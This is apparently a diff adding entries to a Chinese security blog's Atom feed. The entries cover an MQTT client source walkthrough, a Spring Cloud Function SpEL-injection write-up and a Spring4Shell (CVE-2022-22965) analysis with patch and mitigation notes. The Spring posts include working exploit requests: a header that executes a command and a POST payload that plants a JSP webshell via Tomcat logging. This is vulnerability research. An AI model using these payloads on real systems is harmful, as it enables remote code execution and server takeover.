+            throw new IllegalArgumentException(&quot;Null clientId&quot;);
+        } else {
+            int clientIdLength = 0;
+
+            for(int i = 0; i &lt; clientId.length() - 1; ++i) {
+                if (Character_isHighSurrogate(clientId.charAt(i))) {
+                    ++i;
+                }
+
+                ++clientIdLength;
+            }
+
+            if (clientIdLength &gt; 65535) {
+                throw new IllegalArgumentException(&quot;ClientId longer than 65535 characters&quot;);
+            } else {
+                MqttConnectOptions.validateURI(serverURI);
+                this.serverURI = serverURI;
+                this.clientId = clientId;
+                this.persistence = persistence;
+                if (this.persistence == null) {
+                    this.persistence = new MemoryPersistence();
+                }
+
+                this.executorService = executorService;
+                if (this.executorService == null) {
+                    this.executorService = Executors.newScheduledThreadPool(10);
+                }
+
+                log.fine(CLASS_NAME, &quot;MqttAsyncClient&quot;, &quot;101&quot;, new Object[]{clientId, serverURI, persistence});
+                this.persistence.open(clientId, serverURI);
+                this.comms = new ClientComms(this, this.persistence, pingSender, this.executorService);
+                this.persistence.close();
+                this.topics = new Hashtable();
+            }
+        }
+    }
+</code></pre>
+<p>最终都指向org.eclipse.paho.client.mqttv3.MqttAsyncClient#MqttAsyncClient(java.lang.String, java.lang.String, org.eclipse.paho.client.mqttv3.MqttClientPersistence, org.eclipse.paho.client.mqttv3.MqttPingSender, java.util.concurrent.ScheduledExecutorService)</p>
+<p>首先设置参数和日志，然后clientid不能为null也不能大于65535个字符，然后进入到连接步骤</p>
+<p>调用了org.eclipse.paho.client.mqttv3.MqttConnectOptions#validateURI</p>
+<p>这里的MqttConnectOptions是一个工具类，用来设置连接的参数以及调用一些连接要用到的方法</p>
+<pre><code class="language-java">public static int validateURI(String srvURI) {
+        try {
+            URI vURI = new URI(srvURI);
+            if (&quot;ws&quot;.equals(vURI.getScheme())) {
+                return 3;
+            } else if (&quot;wss&quot;.equals(vURI.getScheme())) {
+                return 4;
+            } else if (vURI.getPath() != null &amp;&amp; !vURI.getPath().isEmpty()) {
+                throw new IllegalArgumentException(srvURI);
+            } else if (&quot;tcp&quot;.equals(vURI.getScheme())) {
+                return 0;
+            } else if (&quot;ssl&quot;.equals(vURI.getScheme())) {
+                return 1;
+            } else if (&quot;local&quot;.equals(vURI.getScheme())) {
+                return 2;
+            } else {
+                throw new IllegalArgumentException(srvURI);
+            }
+        } catch (URISyntaxException var2) {
+            throw new IllegalArgumentException(srvURI);
+        }
+    }
+</code></pre>
+<p>将serverUrl转为URL对象然后通过getScheme方法来判断使用的网络前缀，并没有获取返回值，只要是这五个网络前缀就不会进入到异常处理（相当于一份白名单处理）</p>
+<p>然后进行赋值，serverURL和clientID不用说，persistence是mqtt自己的持久化机制，如果为空则创建org.eclipse.paho.client.mqttv3.persist.MemoryPersistence</p>
+<figure data-type="image" tabindex="17"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121631.png" alt="image-20220517103742027" loading="lazy"></figure>
+<p>MqttAsyncClient不传入persistence时也会默认创建一个org.eclipse.paho.client.mqttv3.persist.MqttDefaultFilePersistence</p>
+<p>也就是说MqttDefaultFilePersistence是默认方式，但是persistence为null时变为瞬时消息保存在内存中。如果在连接中MqttConnectOptions.setCleanSession(boolean)这个参数为true，那么client掉线下次重连，将清空内存persistence消息，如果为false，就会使用持久化机制去重传。（对应了mqtt协议中CONNECT消息里的CleanSession字段）</p>
+<p>再往下创建了线程池，默认size为10，executorService就是返回的线程池。</p>
+<p>然后日志记录，调用org.eclipse.paho.client.mqttv3.MqttClientPersistence#open，这里如果是MemoryPersistence则hashtable为空。如果是MqttDefaultFilePersistence则做一个持久化操作：将clientid和serverurl用-拼接然后保存在本地。</p>
+<pre><code class="language-java">public void open(String clientId, String theConnection) throws MqttPersistenceException {
+        if (this.dataDir.exists() &amp;&amp; !this.dataDir.isDirectory()) {
+            throw new MqttPersistenceException();
+        } else if (!this.dataDir.exists() &amp;&amp; !this.dataDir.mkdirs()) {
+            throw new MqttPersistenceException();
+        } else if (!this.dataDir.canWrite()) {
+            throw new MqttPersistenceException();
+        } else {
+            StringBuffer keyBuffer = new StringBuffer();
+
+            int i;
+            char c;
+            for(i = 0; i &lt; clientId.length(); ++i) {
+                c = clientId.charAt(i);
+                if (this.isSafeChar(c)) {
+                    keyBuffer.append(c);
+                }
+            }
+
+            keyBuffer.append(&quot;-&quot;);
+
+            for(i = 0; i &lt; theConnection.length(); ++i) {
+                c = theConnection.charAt(i);
+                if (this.isSafeChar(c)) {
+                    keyBuffer.append(c);
+                }
+            }
+
+            synchronized(this) {
+                if (this.clientDir == null) {
+                    String key = keyBuffer.toString();
+                    this.clientDir = new File(this.dataDir, key);
+                    if (!this.clientDir.exists()) {
+                        this.clientDir.mkdir();
+                    }
+                }
+
+                try {
+                    this.fileLock = new FileLock(this.clientDir, &quot;.lck&quot;);
+                } catch (Exception var6) {
+                }
+
+                this.restoreBackups(this.clientDir);
+            }
+        }
+    }
+</code></pre>
+<p>再往下创建org.eclipse.paho.client.mqttv3.internal.ClientComms对象</p>
+<pre><code class="language-java">public ClientComms(IMqttAsyncClient client, MqttClientPersistence persistence, MqttPingSender pingSender, ExecutorService executorService) throws MqttException {
+        this.conState = 3;
+        this.client = client;
+        this.persistence = persistence;
+        this.pingSender = pingSender;
+        this.pingSender.init(this);
+        this.executorService = executorService;
+        this.tokenStore = new CommsTokenStore(this.getClient().getClientId());
+        this.callback = new CommsCallback(this);
+        this.clientState = new ClientState(persistence, this.tokenStore, this.callback, this, pingSender);
+        this.callback.setClientState(this.clientState);
+        log.setResourceName(this.getClient().getClientId());
+    }
+</code></pre>
+<p>这里讲一下pingSender，这是在创建MqttAsyncClient对象时创建的</p>
+<figure data-type="image" tabindex="18"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121632.png" alt="image-20220517112709013" loading="lazy"></figure>
+<p>用于在每个保持活动间隔向 MQTT 代理发送 ping 数据包的对象，也就是心跳时间</p>
+<pre><code class="language-java">public void init(ClientComms comms) {
+        if (comms == null) {
+            throw new IllegalArgumentException(&quot;ClientComms cannot be null.&quot;);
+        } else {
+            this.comms = comms;
+        }
+    }
+</code></pre>
+<p>ini初始方法，传入了ClientComms，也就是当前客户端的内部状态。</p>
+<p>然后分别创建了CommsTokenStore，CommsCallback，ClientState对象，这里大概讲一下三个类的作用</p>
+<p>先讲CommsTokenStore，CommsTokenStore提供提供基于“token”的系统，用于跨多个线程存储和跟踪操作（多线程），所关联的Token将会使用saveToken保存，任何一个感兴趣的追踪状态通过getTkoen在wait方法或者使用监听进行回调。</p>
+<p>而CommsCallback是Receiver 和外部 API 之间的桥梁。 用来桥接Receiver和外部api进行回调，它将转换MQTT message objects进行最终回调。</p>
+<p>最重要的就是ClientState类，它是客户端的核心，它保存待处理和正在进行的消息的状态信息。已接受传递的消息在传递时会在多个对象之间移动。</p>
+<ol>
+<li>当客户端不运行时，消息存储在实现 MqttClientPersistent 接口的持久存储中。默认值为 MqttDefaultFilePersistencew，它在故障和系统重新启动时安全地存储消息。如果没有指定持久性，则回退到 MemoryPersistence，它将在实例化 Mqtt 客户端时保存和维护消息。 （CleanSession的实现）</li>
+<li>当客户端或特别是 ClientState 被实例化时
+<ul>
+<li>如果 QoS 2 PUBLISH 或 PUBREL 消息从持久存储将会读取到 outboundqos2 hashtable</li>
+<li>如果 QoS 1 PUBLISH 消息从持久存储将会读取到 outboundqos1 hashtable</li>
+</ul>
+</li>
+<li>在连接时，根据 messageid 将outbound hashtables中的messages顺序发送到 pendingMessages 或 pendingFlows vector。
+<ol>
+<li>初始消息发布进入endingmessages buffer（等待数据队列）</li>
+<li>PUBREL 进入pendingflows buffer （飞行窗口队列）</li>
+</ol>
+</li>
+<li>发送线程同时从pendingflows 和pendingmessages 缓冲区读取消息。消息从pendingbuffer中删除，但仍保留在outbound hashtable中。</li>
+<li>接收线程
+<ul>
+<li>如果是 QoS 1 消息，则移除持久化已经从 outboundqos1 中删除 消息</li>
+<li>如果 是QoS 2 PUBREC send PUBREL 消息，使用 PUBREL 更新 outboundqos2 条目并持久化。</li>
+<li>如果 是QoS 2 PUBCOMP  消息，将会移除持久化和outboundqos2对应消息</li>
+</ul>
+</li>
+</ol>
+<h2 id="流程分析">流程分析</h2>
+<p><strong>学习了这些概念后，后续可以再通过debug来从流程的角度进行学习</strong></p>
+<p>由于是客户端，主要从五个点来进行源码学习</p>
+<ul>
+<li>连接broker</li>
+<li>创建主题</li>
+<li>发布主题内容</li>
+<li>订阅主题</li>
+<li>接收主题内容</li>
+</ul>
+<h2 id="参考">参考</h2>
+<ul>
+<li>mqttv3文档：https://www.eclipse.org/paho/files/javadoc/index.html</li>
+<li>mqttv3项目：https://github.com/eclipse/paho.mqtt.java</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Spring Cloud Function Spel表达式注入]]></title>
+        <id>https://liangyueliangyue.github.io/post/spring-cloud-function-spel-biao-da-shi-zhu-ru/</id>
+        <link href="https://liangyueliangyue.github.io/post/spring-cloud-function-spel-biao-da-shi-zhu-ru/">
+        </link>
+        <updated>2022-04-04T16:50:20.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="spring-cloud-function-spel表达式注入">Spring Cloud Function Spel表达式注入</h1>
+<h2 id="漏洞概述"><strong>漏洞概述</strong></h2>
+<p>Spring Cloud Function 是基于Spring Boot 的函数计算框架（FaaS），支持基于SpEL的函数式动态路由。在特定配置下，3 &lt;= 版本 &lt;= 3.2.2（ commit dc5128b 之前）存在SpEL表达式执行导致的RCE。</p>
+<h2 id="环境搭建"><strong>环境搭建</strong></h2>
+<p>在IDEA中选择新建项目，然后选择<code>Spring Initializr</code>，输入随机项目名称，然后选择java版本和jdk版本后点击下一步。</p>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/7922e470c335173d8ad14cb74a437406.png" alt="image-20220403220315187" loading="lazy"></figure>
+<p>选择Spring Web Spring Cloud function</p>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/b50c8583f60481ff750127dab7682d71.png" alt="image-20220403222049811" loading="lazy"></figure>
+<p>最新版本3.2.2也是存在漏洞的，若在官方出新版本后想要复现此漏洞，那么需要修改pom中<code>spring-cloud-function-web</code>的版本为3.2.2，如下图所示：</p>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/ef75eef59b4aa593235b14aaca073506.png" alt="image-20220403222337581" loading="lazy"></figure>
+<p>确认项目中的<code>spring-cloud-function-web</code>是存在漏洞版本后，就可以直接启动项目了，无需进行任何修改。</p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>弹计算器payload</p>
+<pre><code>POST /functionRouter HTTP/1.1
+Host:127.0.0.1:8080
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)
+Content-Type:application/x-www-form-urlencoded
+Content-Length: 3
+
+xxx
+</code></pre>
+<p>看一眼POC就知道其实就是简单的在请求的headers头上添加一个spring.cloud.function.routing-expression参数</p>
+<p>SpringCloud Function会直接将其参数内容直接带入到SPEL中查询，造成SPEL漏洞注入。</p>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/5761fd84e05aa25797e3ca243bfb81fe.png" alt="image-20220403231631626" loading="lazy"></figure>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>漏洞是出在SpringCloud Function的RoutingFunction功能上，其功能的目的本身就是为了微服务应运而生的，可以直接通过HTTP请求与单个的函数进行交互，同时为spring.cloud.function.definition参数提供您要调用的函数的名称。</p>
+<p>为了更好的分析，可以先在springcloudfunctionspel\src\main\java\com\example\springcloudfunctionspel\SpringcloudfunctionspelApplication.java中写测试Demo</p>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/1deadf63379e69adc75a3c1cc8453b3f.png" alt="image-20220403232848334" loading="lazy"></figure>
+<p>然后再进行访问，请求中写出存在的函数就能够调用</p>
+<pre><code>POST /functionRouter HTTP/1.1
+Host: localhost:8080
+spring.cloud.function.definition: uppercase
+Content-Type: text/plain
+Content-Length: 3
+
+abc
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/img_convert/b75263cf8b3d9abc5c2aaf3168dcc3cd.png" alt="image-20220403233039490" loading="lazy"></figure>
+<p>成功得到abc的大写结果ABC</p>
+<p>漏洞存在于header头的spring.cloud.function.routing-expression参数</p>
+<p>，和definition相同，他也是官方提供的功能。</p>
+<p>在org.springframework.cloud.function.web.util.FunctionWebRequestProcessingHelper#processRequest方法下断点</p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/img_convert/ccacf2c2237cb4c7935044bc4d9b6cca.png" alt="image-20220405001126121" loading="lazy"></figure>
+<p>程序会判断当前请求是否为RoutingFunction</p>
+<figure data-type="image" tabindex="8"><img src="https://img-blog.csdnimg.cn/img_convert/b3ca0097e43fde9f71afcef23124b2c0.png" alt="image-20220405001144798" loading="lazy"></figure>
+<p>并将我们提交的请求头和请求体内容编译成Message并且传入FunctionInvocationWrapper的apply方法中</p>
+<figure data-type="image" tabindex="9"><img src="https://img-blog.csdnimg.cn/img_convert/27a1082925c984cc56440d8388a7c959.png" alt="image-20220405001504170" loading="lazy"></figure>
+<p>跟进RoutingFunction的apply方法</p>
+<figure data-type="image" tabindex="10"><img src="https://img-blog.csdnimg.cn/img_convert/633900a7c3fde622f48eee490b9644ad.png" alt="image-20220405001656778" loading="lazy"></figure>
+<p>最后进入到org.springframework.cloud.function.context.config.RoutingFunction#route方法中</p>
+<figure data-type="image" tabindex="11"><img src="https://img-blog.csdnimg.cn/img_convert/8245fce7961226d51e3831675830348f.png" alt="image-20220405001743831" loading="lazy"></figure>
+<p>然后在这里判断了请求headers头中有没有spring.cloud.function.routing-expression参数（这里可以清晰的看到spring.cloud.function.definition也是在这里做判断的）</p>
+<p>并将结果带入到this.functionFromExpression()方法中</p>
+<figure data-type="image" tabindex="12"><img src="https://img-blog.csdnimg.cn/img_convert/28c6a9fd93c34062a08c8b794fbb48e0.png" alt="image-20220405002455553" loading="lazy"></figure>
+<p>在这里最后SpelExpressionParser解析了Spel表达式，调用了expression.getValue导致Spel表达式注入</p>
+<figure data-type="image" tabindex="13"><img src="https://img-blog.csdnimg.cn/img_convert/418d3c835ac193094df6f9ecec901ec3.png" alt="image-20220405003124333" loading="lazy"></figure>
+<p>而他的EvaluationContext又采取了默认的StandardEvaluationContext，在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)或者直接new来调用任意对象的任意方法，成功造成任意命令执行。</p>
+<figure data-type="image" tabindex="14"><img src="https://img-blog.csdnimg.cn/img_convert/8d25fed78e59e94e587f619e4dc1ce4a.png" alt="image-20220405004040946" loading="lazy"></figure>
+<h2 id="补丁分析">补丁分析</h2>
+<ul>
+<li>https://github.com/spring-cloud/spring-cloud-function/commit/dc5128b80c6c04232a081458f637c81a64fa9b52</li>
+</ul>
+<p>由于又是Spel注入问题，很容易定位到Context</p>
+<figure data-type="image" tabindex="15"><img src="https://img-blog.csdnimg.cn/img_convert/27c534f16c73bb37ccadad7585eee937.png" alt="image-20220330141227267" loading="lazy"></figure>
+<p>新增了headerEvalContext常量为SimpleEvaluationContext，显然是为了替换evalContext常量的StandardEvaluationContext而创建的</p>
+<figure data-type="image" tabindex="16"><img src="https://img-blog.csdnimg.cn/img_convert/f61fd2d9c832c7d20edda3f6e231c97a.png" alt="image-20220403231314162" loading="lazy"></figure>
+<p>增加了判断来源是否是header，如果是header就使用属于SimpleEvaluationContext的headerEvalContext，不是header才会使用属于StandardEvaluationContext的evalContext。</p>
+<p>从而解决了发送恶意请求就能够RCE的问题。</p>
+<h2 id="后记">后记</h2>
+<p>整个流程也是很清晰，就是官方提供的类似spring.cloud.function.definition的功能，spring.cloud.function.routing-expression有解析Spel表达式的能力，而且使用的是默认的StandardEvaluationContext。最终Spel表达式注入造成了命令执行。</p>
+<p>和<strong>Spring Cloud Gateway rce</strong>其实是相似的，都是官方提供的功能有Spel表达式解析能力，但都没有对指定EvaluationContext，采用默认的StandardEvaluationContext从而导致了命令执行。</p>
+<p>不过这个影响范围在国内是更小的，后续的回显链挖掘也没有进行（也是因为影响范围吧）</p>
+<h2 id="参考">参考</h2>
+<ul>
+<li>https://www.cnblogs.com/wh4am1/p/16062306.html</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Spring Framework RCE(CVE-2022-22965)]]></title>
+        <id>https://liangyueliangyue.github.io/post/spring-framework-rcecve-2022-22965/</id>
+        <link href="https://liangyueliangyue.github.io/post/spring-framework-rcecve-2022-22965/">
+        </link>
+        <updated>2022-04-02T05:22:45.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="spring-framework-rcecve-2022-22965">Spring Framework RCE(CVE-2022-22965)</h1>
+<h2 id="利用环境">利用环境</h2>
+<ul>
+<li>war包
+<ul>
+<li>https://github.com/fengguangbin/spring-rce-war</li>
+</ul>
+</li>
+<li>docker环境
+<ul>
+<li>https://github.com/lunasec-io/Spring4Shell-POC</li>
+<li>https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965</li>
+</ul>
+</li>
+<li>在线环境
+<ul>
+<li>http://vulfocus.io</li>
+</ul>
+</li>
+</ul>
+<h2 id="漏洞原理">漏洞原理</h2>
+<p>简答来说就是参数绑定造成的变量覆盖漏洞，漏洞点spring-beans包中。</p>
+<p>Spring MVC 框架的参数绑定功能提供了将请求中的参数绑定控制器方法中参数对象的成员变量，通过 ClassLoader构造恶意请求获取AccessLogValue 对象并注入恶意字段值，来更改 Tomcat 服务器的日志记录属性触发 pipeline 机制写入任意路径下的文件。</p>
+<h3 id="cve-2010-1622">CVE-2010-1622</h3>
+<p>这个漏洞其实就是CVE-2010-1622的绕过，CVE-2010-1622可以参考Ruilin大佬写的</p>
+<pre><code>http://rui0.cn/archives/1158
+</code></pre>
+<p>简单来说就是可以获取到Classloader，而在Tomcat中，一些和Tomcat的全局配置相关的属性都保存在<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>这个Tomcat专属的ClassLoader当中。</p>
+<p>那么，我们就可以通过person.getClass().getClassLoader().getXXX()修改ParallelWebappClassLoader中的一些属性来修改Tomcat的配置项。也就是后面的利用：<strong>tomcat AccessLogValue</strong>，这里先不讲。</p>
+<p>Spring对这个漏洞的修复方式，就是通过黑名单的方式，增加了if语句来检查用户输入。</p>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/5c623fa7f431436608fc1a8966aaa4af.png" alt="image-20220402125933198" loading="lazy"></figure>
+<p>这个if语句的意思就是，当发现当前的对象是一个Class，然后又在获取其classLoader属性，则直接跳过。这样就断了之间的class.classLoader这条链。</p>
+<p>至于为什么现在又绕过了，其实看payload就能看出端倪</p>
+<pre><code>class.module.classLoader.resources.context.parent.pipeline.first.pattern
+</code></pre>
+<p>class.module.classLoader</p>
+<p>这个module是什么，其实就是jdk9开始引入的模块系统（这也说明了为什么这个漏洞的影响范围是jdk9+）</p>
+<pre><code>https://juejin.cn/post/6844903501311524871
+</code></pre>
+<p>module存在getClassLoader()方法,正好用来写一条新的链</p>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/51043c67de05bcac5bc536edfffb6e91.png" alt="image-20220402125222928" loading="lazy"></figure>
+<p>之前的链</p>
+<pre><code>class.classLoader.resources.context.parent.pipeline.first.pattern
+</code></pre>
+<p>现在</p>
+<pre><code>class.module.classLoader.resources.context.parent.pipeline.first.pattern
+</code></pre>
+<p>其实就只是module链点的增加导致了了官方的黑名单防御被绕过</p>
+<h3 id="tomcat-accesslogvalue">tomcat AccessLogValue</h3>
+<p>这个利用手法在strust2上的ClassLoader 漏洞 (CVE-2014-0094) 上早就出现过</p>
+<pre><code>https://www.exploit-db.com/exploits/33142
+</code></pre>
+<p>利用了 Tomcat 使用的<strong>ClassLoader</strong></p>
+<p>该漏洞通过修改 Tomcat 的日志设置（通过AccessLogValve)来写入恶意文件</p>
+<pre><code>https://tomcat.apache.org/tomcat-8.0-doc/config/valve.html
+</code></pre>
+<p>主要利用字段</p>
+<table>
+<thead>
+<tr>
+<th>directory</th>
+<th>将放置此 Valve 创建的日志文件的目录的绝对或相对路径名。如果指定了相对路径，则将其解释为相对于 $CATALINA_BASE。如果未指定目录属性，则默认值为“logs”（相对于 $CATALINA_BASE）。</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>prefix</code></td>
+<td>添加到每个日志文件名称开头的前缀。如果未指定，默认值为“access_log”。</td>
+</tr>
+<tr>
+<td><code>suffix</code></td>
+<td>添加到每个日志文件名称末尾的后缀。如果未指定，则默认值为“”（长度为零的字符串），表示不会添加后缀。</td>
+</tr>
+<tr>
+<td><code>fileDateFormat</code></td>
+<td>允许在访问日志文件名中自定义时间戳。每当格式化的时间戳更改时，文件就会旋转。默认值为<code>.yyyy-MM-dd</code>。如果您希望每小时轮换一次，则将此值设置为<code>.yyyy-MM-dd.HH</code>。日期格式将始终使用 locale 进行本地化<code>en_US</code>。</td>
+</tr>
+<tr>
+<td><code>pattern</code></td>
+<td><strong>一种格式布局，用于标识要记录的请求和响应中的各种信息字段，或者选择标准格式的 <code>common</code>单词<code>combined</code>。有关配置此属性的更多信息，请参见下文。</strong></td>
+</tr>
+</tbody>
+</table>
+<p>POC中class.classLoader.resources.context.parent.pipeline.first这个属性实际是org.apache.catalina.valves.AccessLogValve，在conf/server.xml里面有一段相关的配置：</p>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/09636baf89478116dea6f7c342a17acd.png" alt="image-20220331142224779" loading="lazy"></figure>
+<p>为何修改了dataformat会触发切换日志呢？注意下面一个属性，默认是true</p>
+<pre><code class="language-javascript"> .class.classLoader.resources.context.parent.pipeline.first.rotatable
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/438c56fc35a538922f3b46706ae492de.png" alt="image-20220331142915175" loading="lazy"></figure>
+<p>每次Log时，都会调用rotate:</p>
+<pre><code class="language-javascript">publicvoid log(CharArrayWriter message)  {rotate();…
+</code></pre>
+<p>而rotate是检查当前的systime 经过format后，与当前的tsDate是否相同。如果日期不同了，自然需要切换日志文件了：</p>
+<pre><code class="language-javascript">public void rotate(){
+    if (this.rotatable){
+        long systime =System.currentTimeMillis();
+        if (systime - this.rotationLastChecked&gt; 1000L)
+            synchronized (this){
+                if (systime -this.rotationLastChecked &gt; 1000L){
+                    this.rotationLastChecked = systime; 
+                String tsDate =this.fileDateFormatter.format(new Date(systime)); 
+                if (!this.dateStamp.equals(tsDate)){
+                    close(true);
+                    this.dateStamp = tsDate;
+                    open();
+                }
+            }
+        }
+    }
+}
+</code></pre>
+<p>所以修改了dateFormat，就触发了日志切换。这是由tomcat代码决定的。在linux与windows下证实该问题均存在。</p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<h3 id="payload">payload</h3>
+<pre><code class="language-jsp">POST /index HTTP/1.1
+Host: 192.168.137.222:8077
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Cache-Control: no-cache
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Length: 494
+suffix: %&gt;
+prefix: &lt;%Runtime
+
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di.getRuntime%28%29.exec%28request.getParameger%28%22cmd%22%29%29%3B%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=C%3a%2Ftmp&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=6right&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+</code></pre>
+<p>%不能够出现，需要使用占位符替换，占位符是什么？</p>
+<h3 id="pattern参数自定义请求头">pattern参数自定义请求头</h3>
+<p>AccessLogValve还支持写入信息传入或传出标头、cookie、会话或请求属性和特殊时间戳格式。它以 <a href="https://httpd.apache.org/">Apache HTTP Server</a>日志配置语法为模型。<code>xxx</code>它们中的每一个都可以使用不同的键 多次使用：</p>
+<ul>
+<li>%{xxx}i 请求headers的信息</li>
+<li>%{xxx}o 响应headers的信息</li>
+<li>%{xxx}c 请求cookie的信息</li>
+<li>%{xxx}r xxx是ServletRequest的一个属性</li>
+<li>%{xxx}s xxx是HttpSession的一个属性</li>
+</ul>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/5c57e18af827f593e40da69458474499.png" alt="image-20220330220206577" loading="lazy"></figure>
+<p>所以我们可以通过日志的配置语法来进行占位符写入%</p>
+<h2 id="利用脚本编写">利用脚本编写</h2>
+<h3 id="问题一">问题一</h3>
+<p>日志的机制，初次写入之后不能改变写入文件名称以及内容路径，且每次访问都会追加一次内容</p>
+<h4 id="解决">解决</h4>
+<ol>
+<li>写入webshell加上&lt;!--注释后面的内容</li>
+<li>执行内容为写入内容到其他文件中</li>
+</ol>
+<p>根本解决：<strong>修改dataformat可以触发切换日志，是tomcat日志决定的</strong></p>
+<h3 id="问题二">问题二</h3>
+<p>写入内容不能存在%，会变成三个问号</p>
+<h4 id="解决-2">解决</h4>
+<p>使用占位符解决</p>
+<h3 id="持久化利用">持久化利用</h3>
+<p>写入内存马？（没去实现）</p>
+<h2 id="脚本实现">脚本实现</h2>
+<ol>
+<li>漏洞探测</li>
+<li>写入冰蝎马</li>
+<li>自定义写入文件名称及路径</li>
+<li>不会追加写入到同一文件中</li>
+</ol>
+<p>脚本github地址，记得给个☆</p>
+<pre><code>https://github.com/liangyueliangyue/spring-core-rce
+</code></pre>
+<h2 id="官方修复">官方修复</h2>
+<ul>
+<li>https://github.com/spring-projects/spring-framework/commit/afbff391d8299034cd98af968981504b6ca7b38c</li>
+</ul>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/img_convert/f502f1ee267688e13c27198078198f0b.png" alt="image-20220402131253696" loading="lazy"></figure>
+<p>可以看到，这次官方不在采用黑名单的形式去防御（不然继续过滤module，以后更新还有modulf ， modulg等等，就天天打补丁了），而是采用白名单，当beanClass是class.Class时，只允许添加name属性。并且如果属性是<code>ClassLoader</code> 和 <code>ProtectionDomain</code>，会被忽略。</p>
+<h2 id="waf防御">waf防御</h2>
+<p>对“class.<em>”“Class.</em>”“<em>.class.</em>”“<em>.Class.</em>”等字符串，部署规则进行过滤</p>
+<h2 id="临时修复">临时修复</h2>
+<p>需同时按以下两个步骤进行漏洞的临时修复:</p>
+<ol>
+<li>在应用中全局搜索@InitBinder注解，看看方法体内是否调用dataBinder.setDisallowedFields方法，如果发现此代码片段的引入，则在原来的黑名单中，添加{&quot;class.<em>&quot;,&quot;Class.</em> &quot;,&quot;<em>. class.</em>&quot;, &quot;<em>.Class.</em>&quot;}。 (注:如果此代码片段使用较多,需要每个地方都追加)</li>
+<li>在应用系统的项目包下新建以下全局类，并保证这个类被Spring 加载到(推荐在Controller 所在的包中添加).完成类添加后，需对项目进行重新编译打包和功能验证测试。并重新发布项目。</li>
+</ol>
+<pre><code class="language-java">import org.springframework.core.annotation.Order;
+import org.springframework.web.bind.WebDataBinder;
+import org.springframework.web.bind.annotation.ControllerAdvice;
+import org.springframework.web.bind.annotation.InitBinder;
+@ControllerAdvice
+@Order(10000)
+public class GlobalControllerAdvice{ 
+ @InitBinder
+ public void setAllowedFields(webdataBinder dataBinder){
+     String[]abd=new string[]{&quot;class.*&quot;,&quot;Class.*&quot;,&quot;*.class.*&quot;,&quot;*.Class.*&quot;};
+     dataBinder.setDisallowedFields(abd);
+ }
+}
+</code></pre>
+<h2 id="后记">后记</h2>
+<p>这次的spring漏洞传的沸沸扬扬，最后的结果却是雷声大雨点小。当前确定的spring 框架漏洞前置条件比较苛刻，影响范围并不大，并不能做到比肩log4j</p>
+<p>目前来看后续的利用只能围绕classLoader去进行深入挖掘。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[JavaSec-RMI]]></title>
+        <id>https://liangyueliangyue.github.io/post/javasec-rmi/</id>
+        <link href="https://liangyueliangyue.github.io/post/javasec-rmi/">
+        </link>
+        <updated>2022-03-22T12:15:48.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="rmi">RMI</h1>
+<p><code>RMI(Remote Method Invocation)</code>即<code>Java</code>远程方法调用，<code>RMI</code>用于构建分布式应用程序，<code>RMI</code>实现了<code>Java</code>程序之间跨<code>JVM</code>的远程通信。让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法。</p>
+<p><strong>RMI结构</strong></p>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/2a73cacd97b0dda53d33a539a9eea54b.png" alt="image-20220321134350254" loading="lazy"></figure>
+<p><code>RMI</code>底层通讯采用了<code>Stub(运行在客户端)</code>和<code>Skeleton(运行在服务端)</code>机制，<code>RMI</code>调用远程方法的大致如下：</p>
+<ol>
+<li><code>RMI客户端</code>在调用远程方法时会先创建<code>Stub(sun.rmi.registry.RegistryImpl_Stub)</code>。</li>
+<li><code>Stub</code>会将<code>Remote</code>对象传递给<code>远程引用层(java.rmi.server.RemoteRef)</code>并创建<code>java.rmi.server.RemoteCall(远程调用)</code>对象。</li>
+<li><code>RemoteCall</code>序列化<code>RMI服务名称</code>、<code>Remote</code>对象。</li>
+<li><code>RMI客户端</code>的<code>远程引用层</code>传输<code>RemoteCall</code>序列化后的请求信息通过<code>Socket</code>连接的方式传输到<code>RMI服务端</code>的<code>远程引用层</code>。</li>
